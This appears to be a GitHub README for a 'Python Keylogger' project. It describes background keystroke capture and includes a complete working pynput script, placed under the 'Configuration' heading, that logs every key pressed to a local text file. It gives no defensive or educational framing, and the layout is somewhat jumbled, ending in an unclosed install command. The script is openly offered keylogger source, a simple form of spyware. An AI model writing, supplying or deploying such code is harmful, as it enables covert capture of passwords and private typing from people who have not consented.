<p align="center">
  <img src="https://img.shields.io/github/license/yourusername/python-keylogger?color=blue" alt="License">
  <img src="https://img.shields.io/github/stars/yourusername/python-keylogger" alt="Stars">
  <img src="https://img.shields.io/github/forks/yourusername/python-keylogger" alt="Forks">
</p>

<h1 align="center">Python Keylogger</h1>

<p align="center">
  <strong>A simple keylogger implemented in Python using the <code>pynput</code> library.</strong>
</p>

---

## Table of Contents

- [Features](#features)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)


---

## Features

- Captures keystrokes in the background.
- Logs keystrokes to a text file.
- Supports filtering out certain keystrokes (e.g., space, shift, control).

## Configuration
from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.shift_r':
        letter = ''
    elif letter == 'Key.ctrl_l':
        letter = ''

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()


## Prerequisites

- Python 3.x installed on your system.
- Required Python packages can be installed via pip:

  ```bash
  pip install pynput
